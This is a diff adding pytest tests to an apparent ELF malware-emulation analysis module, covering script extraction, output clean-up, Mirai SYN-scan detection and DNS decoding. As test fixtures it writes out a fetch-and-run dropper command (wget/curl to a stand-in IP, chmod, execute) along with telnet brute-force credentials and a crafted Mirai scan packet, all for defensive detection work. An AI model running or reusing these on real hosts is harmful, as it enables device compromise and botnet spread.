@@ -1,3 +1,4 @@
+import struct
 import os
 import re
 from types import SimpleNamespace
@@ -168,7 +169,7 @@ def test_a_session_cut_short_does_not_split_identical_conversations():
 def test_unsupported_file_gets_a_collapsed_explanation_with_no_heuristic():
     p = Prog()
     p.exit(0)
-    blob = p.build(machine=40)   # EM_ARM
+    blob = p.build(machine=20)   # EM_PPC
 
     class Req:
         file_contents = blob
@@ -228,3 +229,104 @@ def test_manifest_accepts_elf32_and_elf64_only():
         assert re.fullmatch(accepts, ok)
     for no in ("executable/windows/pe64", "executable/linux/elf", "code/shell", "executable/linux/elf128"):
         assert not re.fullmatch(accepts, no)
+
+
+
+# ---- shell commands become extracted scripts ---------------------------------------------
+def _scripts(events, tmp_path, monkeypatch):
+    monkeypatch.setattr(ElfSim, "working_directory", property(lambda self: str(tmp_path)))
+    got = []
+
+    class Req:
+        def add_extracted(self, path, name, desc, **kw):
+            got.append((name, open(path).read(), kw.get("parent_relation")))
+            return True
+    ElfSim()._scripts(Req(), SimpleNamespace(events=events))
+    return got
+
+
+def _exec(*argv):
+    return {"kind": "process", "syscall": "execve", "path": argv[0], "argv": list(argv)}
+
+
+def test_sh_dash_c_commands_are_extracted_as_scripts_for_bashsim_and_payloadfetcher(tmp_path, monkeypatch):
+    cmd = "cd /tmp && (wget -q -O /tmp/.x 'http://198.51.100.7/a' || curl -ks -o /tmp/.x 'http://198.51.100.7/a') && chmod +x /tmp/.x && /tmp/.x &"
+    (name, body, relation), = _scripts([_exec("/bin/sh", "-c", cmd), _exec("/bin/sh", "-c", cmd)], tmp_path, monkeypatch)
+    assert name == "emulated_command_0.sh" and body == "#!/bin/sh\n" + cmd + "\n"     # deduplicated
+    assert str(relation).endswith("DYNAMIC")
+
+
+def test_non_shell_execs_and_plain_shell_starts_are_not_extracted(tmp_path, monkeypatch):
+    events = [_exec("/usr/bin/wget", "-O", "x", "http://198.51.100.7/"), _exec("/bin/sh"), _exec("sh", "-c")]
+    assert _scripts(events, tmp_path, monkeypatch) == []
+
+
+
+# ---- output clean-up: colour codes and login-attempt noise --------------------------------
+def test_ansi_colours_are_removed_and_plain_text_gets_no_readable_text_line():
+    banner = b"\x1b[0m[\x1b[1;31mSnoopy.\x1b[0m][\x1b[1;31m0.0.0.0\x1b[0m] \x1b[1;31m>\x1b[0m [Unknown]\n"
+    (section,) = _sections(ElfSim._sent_data, _report(sent=[_conv([[banner, 1]])] * 147))
+    assert "\\x1b" not in section.body and "[Snoopy.][0.0.0.0] > [Unknown]" in section.body
+    assert "readable text" not in section.body and "(identical in 147 connections)" in section.body
+    assert "(colour codes removed)" in section.body
+
+
+def test_a_telnet_login_brute_force_is_summarised_not_listed():
+    attempts = ([[b"root\r\n", 27], [b"admin\r\n", 15], [b"support\r\n", 2], [b"guest\r\n", 1], [b"ubnt\r\n", 2]])
+    (section,) = _sections(ElfSim._sent_data, _report(sent=[_conv(attempts, ip="203.0.113.9", port=23)]))
+    lines = section.body.splitlines()
+    assert "47 lines, 5 distinct" in section.body
+    assert any(l.strip() == "root    x27" for l in lines) and len(lines) <= 8
+    assert "readable text" not in section.body
+
+
+def test_binary_protocols_still_get_readable_text_without_duplicates():
+    (section,) = _sections(ElfSim._sent_data, _report(sent=[_conv([[b"\x00\x00\x00\x01\x04px86\x03x86\x04px86", 1]])]))
+    assert section.body.count('"px86"') == 1
+
+
+# ---- raw packets and DNS are decoded, not dumped ------------------------------------------
+def _syn(dst: str, sport: int = 1668, dport: int = 23) -> bytes:
+    """A hand-built IPv4/TCP SYN like a Mirai scanner sends: sequence number == destination."""
+    d = bytes(int(o) for o in dst.split("."))
+    ip = bytes([0x45, 0, 0, 40]) + b"\x9c\x9d\0\0" + bytes([64, 6]) + b"\0\0" + b"\0\0\0\0" + d
+    tcp = struct.pack(">HH", sport, dport) + d + b"\0\0\0\0" + bytes([0x50, 0x02]) + struct.pack(">H", 0xA7D0) + b"\0\0\0\0"
+    return ip + tcp
+
+
+def _raw_conv(dst: str):
+    return _conv([[_syn(dst), 1]], ip=dst, port=23, proto="raw")
+
+
+def test_a_syn_scan_is_summarised_with_the_mirai_fingerprint_and_scores():
+    convs = [_raw_conv(f"198.51.100.{i}") for i in range(1, 26)]
+    result = Result()
+    ElfSim()._scanning(result, convs)
+    (section,) = result.sections
+    assert "TCP SYN to port 23 (Telnet): 25 packets to 25 distinct hosts" in section.body
+    assert "198.51.100.1, 198.51.100.2" in section.body and "(+17 more)" in section.body
+    assert "ttl 64, 40 bytes each, window 0xa7d0, source port 1668" in section.body
+    assert "Mirai scanner fingerprint" in section.body
+    assert "\\x" not in section.body and section.heuristic.score == 300
+
+
+def test_a_few_raw_packets_are_shown_but_not_scored_as_scanning():
+    result = Result()
+    ElfSim()._scanning(result, [_raw_conv(f"198.51.100.{i}") for i in range(1, 4)])
+    (section,) = result.sections
+    assert section.heuristic.score == 0 and "3 packets to 3 distinct hosts" in section.body
+
+
+def test_raw_conversations_are_kept_out_of_the_sent_data_listing():
+    sections = _sections(ElfSim._sent_data, _report(sent=[_raw_conv("198.51.100.77"), _conv([[b"hello", 1]])]))
+    sent = next(s for s in sections if s.title_text.startswith("What the sample sent"))
+    scan = next(s for s in sections if s.title_text.startswith("Raw packets"))
+    assert "198.51.100.77" not in sent.body and "hello" in sent.body and "198.51.100.77" in scan.body
+
+
+def test_dns_queries_are_rendered_as_text():
+    query = (struct.pack(">HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
+             + b"\x02c2\x04test\x00" + struct.pack(">HH", 1, 1))
+    conv = _conv([[query, 2]], ip="203.0.113.53", port=53, proto="udp")
+    (section,) = _sections(ElfSim._sent_data, _report(sent=[conv]))
+    assert "DNS query for c2.test (A)    x2" in section.body and "\\x" not in section.body
